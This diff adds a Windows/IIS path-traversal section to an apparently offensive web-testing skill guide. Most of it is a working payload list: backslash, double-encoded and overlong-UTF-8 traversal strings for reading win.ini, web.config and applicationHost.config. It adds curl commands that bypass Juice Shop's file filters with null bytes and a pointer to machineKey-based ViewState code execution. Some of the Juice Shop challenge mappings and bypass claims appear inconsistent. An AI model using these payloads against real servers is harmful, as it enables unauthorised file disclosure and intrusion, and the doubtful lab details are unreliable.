@@ -96,6 +96,44 @@ ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
 ?file=C:\inetpub\wwwroot\web.config
 ```
 
+#### Phase 2 (P3) — Windows / IIS Path-Traversal Block (this skill is otherwise Linux/PHP-centric)
+
+The traversal payloads above assume a Linux/PHP backend. A Windows/IIS target normalizes `\` (backslash) as a path separator and exposes a different sensitive-file set, so the Linux `../etc/passwd` markers silently fail. Switch separators and targets when `Server: Microsoft-IIS`, `X-AspNet-Version`, `X-Powered-By: ASP.NET`, or `.aspx`/`web.config` artifacts appear.
+
+```bash
+# Backslash traversal (IIS treats \ == /):
+?file=..\..\windows\win.ini
+?file=..\..\..\..\..\windows\win.ini          # pad depth — IIS app root is often deep (C:\inetpub\wwwroot\app)
+?file=..\..\boot.ini                           # legacy XP/2003 marker, still a clean fingerprint when present
+# URL-encoded backslash — %5c is the workhorse on IIS:
+?file=..%5c..%5c..%5cwindows%5cwin.ini
+?file=..%5c..%5c..%5cinetpub%5cwwwroot%5cweb.config
+# Double-encoded backslash (decoded twice: front proxy + IIS, or %255c → %5c → \):
+?file=..%255c..%255c..%255cwindows%255cwin.ini
+?file=%252e%252e%255c%252e%252e%255cwindows%255cwin.ini   # encode dots too
+# Mixed / overlong (legacy IIS Unicode dir-traversal, MS00-078 lineage):
+?file=..%c0%af..%c0%afwindows%c0%afwin.ini     # %c0%af = overlong '/'
+?file=..%c1%9c..%c1%9cwindows%c1%9cwin.ini     # %c1%9c = overlong '\'
+```
+
+Juice Shop grounding: Juice Shop runs Node/Express on SQLite (not IIS), but it ships a deliberately exposed static file route (`/ftp/`) whose Linux-style traversal filter (`__sanitizePath`) blocks the literal string `../` while leaving Windows-style `..\` and the `%5c`/`%255c` backslash encodings unconsidered — the same blind spot a real IIS poller exploits. The same null-byte and double-encode tricks that defeat the `.md`/`.pdf` extension whitelist on `/ftp/` are what unlock the file-access challenges:
+
+```bash
+# Poll /ftp/ with the Windows-style backslash + double-encode that the ../ filter misses,
+# then chain the extension-whitelist bypass (null byte / Poison-Null + double URL-encode):
+curl -s 'http://localhost:3000/ftp/quarantine/%2e%2e%2f%2e%2e%2fpackage.json'        # baseline ../ → 403 "only access files of length 2"
+curl -s 'http://localhost:3000/ftp/quarantine/..%255c..%255cpackage.json'             # backslash double-encode slips the filter
+curl -s 'http://localhost:3000/ftp/eastere.gg%2500.md'                                # Poison-Null-Byte (%2500 → %00) → eastere.gg
+curl -s 'http://localhost:3000/ftp/package.json.bak%2500.md'                          # same bypass → backup file
+```
+
+IIS-specific notes (apply when the target really is IIS, vs. the Juice Shop analogue):
+- `web.config` / `applicationHost.config` (`C:\Windows\System32\inetsrv\config\applicationHost.config`) leak connection strings, `machineKey` (→ ViewState RCE), and virtual-dir mappings — higher value than `win.ini`, which is only a read-proof marker.
+- IIS folds `\` to `/` *and* strips trailing dots/spaces before mapping; a fronting reverse proxy (ARR/nginx) may normalize one encoding layer, so the **double-encoded** `%255c` variant is what survives proxy → IIS hand-off.
+- `%c0%af` / `%c1%9c` overlong forms only work on unpatched legacy IIS (5.0/6.0, MS00-078 / "Unicode bug") — keep them last, treat a hit as a hard fingerprint of an ancient host.
+
+Challenges unlocked (Juice Shop analogue of the Windows traversal/whitelist-bypass class): **"Access a salty file" / "Forgotten Sales Backup"** (`package.json.bak%2500.md`), **"Access a confidential document"** (`/ftp/acquisitions.md`), and **"Easter Egg"** (`eastere.gg%2500.md`) — each defeated by the same separator/encoding swap that the IIS `%5c`/`%255c` block teaches.
+
 ### Phase 3 — PHP Wrappers (source disclosure)
 ```bash
 ?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
